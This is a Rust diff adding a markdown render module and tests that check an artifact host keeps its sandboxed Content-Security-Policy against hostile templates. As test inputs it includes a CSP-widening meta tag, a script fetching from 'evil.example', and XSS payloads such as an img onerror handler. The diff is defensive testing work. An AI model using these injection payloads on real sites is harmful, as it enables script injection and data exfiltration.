@@ -23,6 +23,7 @@
 pub mod fixtures;
 pub mod guards;
 pub mod headers;
+pub mod render;
 pub mod shell;
 pub mod space;
 pub mod wrap;
@@ -780,6 +781,107 @@ mod tests {
             assert!(html == a || html == b, "torn snapshot: {html:?}");
         }
         writer.join().unwrap();
+    }
+
+    // --- markdown-template-render: the render path is served like any artifact --
+
+    /// Build a one-space snapshot whose `index` artifact body is `body` (as a
+    /// `render`ed markdown+template output would produce), with a resolved title.
+    fn host_with_rendered_body(body: &str) -> Arc<ArtifactHost> {
+        let title = space::resolve_title(body).unwrap_or_else(|| "r".to_string());
+        let mut sp = Space::default();
+        sp.artifacts.insert(
+            "index".to_string(),
+            Artifact {
+                html: body.to_string(),
+                title,
+            },
+        );
+        sp.nav = vec!["index".into()];
+        sp.home = Some("index".into());
+        host_with_space("r", sp)
+    }
+
+    #[tokio::test]
+    async fn rendered_markdown_artifact_is_wrapped_and_sandboxed() {
+        // A rendered prose fragment is served exactly like a `create`d fragment:
+        // wrapped (doctype + base.css + bridge) under the frozen artifact CSP.
+        let body = render::render_to_body(
+            "# Hello\n\nA para.\n",
+            render::builtin_template("prose").unwrap(),
+        )
+        .unwrap();
+        let host = host_with_rendered_body(&body);
+        let resp = get_on(host, "/r/_c/index").await;
+        assert_eq!(resp.status(), StatusCode::OK);
+        let csp = header(&resp, "content-security-policy");
+        assert!(csp.starts_with("sandbox allow-scripts"), "csp: {csp}");
+        assert!(csp.contains("connect-src 'none'"), "egress open: {csp}");
+        let html = body_string(resp).await;
+        assert!(html.starts_with("<!doctype html>"));
+        assert!(html.contains(r#"<link rel="stylesheet" href="/_gp/v1/base.css">"#));
+        assert!(html.contains(r#"<script src="/_gp/v1/bridge.js" defer></script>"#));
+        // The prose render contract: rendered blocks are children of .gp-prose.
+        assert!(html.contains(r#"<article class="gp-prose">"#));
+        assert!(html.contains("<h1>Hello</h1>"));
+    }
+
+    #[tokio::test]
+    async fn hostile_template_body_cannot_widen_csp() {
+        // A template/markdown that tries to widen CSP (a <meta http-equiv> tag), run
+        // arbitrary script, or break out of the body (a stray </body></html>) must
+        // NOT change the response's CSP: the header is set server-side per response,
+        // independent of body bytes — so a template fails CLOSED at the boundary.
+        let hostile_template = concat!(
+            "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src *; connect-src *\">",
+            "<script>fetch('http://evil.example/x')</script>",
+            "<main>{{content}}</main></body></html>",
+        );
+        let body = render::render_to_body(
+            "text with a `<script>alert(1)</script>` inline",
+            hostile_template,
+        )
+        .unwrap();
+        let host = host_with_rendered_body(&body);
+        let resp = get_on(host, "/r/_c/index").await;
+        let csp = header(&resp, "content-security-policy");
+        // The frozen artifact contract is intact: sandbox on, egress fully closed.
+        assert!(csp.starts_with("sandbox allow-scripts"), "csp: {csp}");
+        assert!(csp.contains("connect-src 'none'"), "egress widened: {csp}");
+        // The body's attempted widening never reached the actual CSP *header*.
+        assert!(!csp.contains("default-src *"), "meta widened header: {csp}");
+        assert!(!csp.contains("connect-src *"), "meta widened header: {csp}");
+    }
+
+    #[tokio::test]
+    async fn rendered_hostile_heading_is_inert_in_shell() {
+        // A markdown body whose heading is hostile becomes the artifact title; the
+        // trusted shell must still render it inert (textContent / JSON-for-script),
+        // never as executable markup — the template/markdown can't inject the shell.
+        let body = render::render_to_body(
+            "# Report <img src=x onerror=alert(1)>\n",
+            render::builtin_template("prose").unwrap(),
+        )
+        .unwrap();
+        // Route the body through the real snapshot builder so the title resolves the
+        // same way `render` (via one_artifact_snapshot) does.
+        let snap = crate::server::one_artifact_snapshot("r", body);
+        let host = Arc::new(ArtifactHost::new(3000));
+        host.swap(snap);
+        // The sandboxed artifact body DOES carry the raw markup (passthrough is fine —
+        // it is inert in the null-origin sandbox under the frozen CSP)…
+        let content = body_string(get_on(host.clone(), "/r/_c/index").await).await;
+        assert!(
+            content.contains("<img src=x onerror"),
+            "body should pass markup through"
+        );
+        // …but the trusted shell (a different route, built from the resolved title
+        // via textContent / JSON-for-script) never emits that raw markup.
+        let shell = body_string(get_on(host, "/r/index").await).await;
+        assert!(
+            !shell.contains("<img src=x onerror"),
+            "shell injection: title raw"
+        );
     }
 
     #[tokio::test]
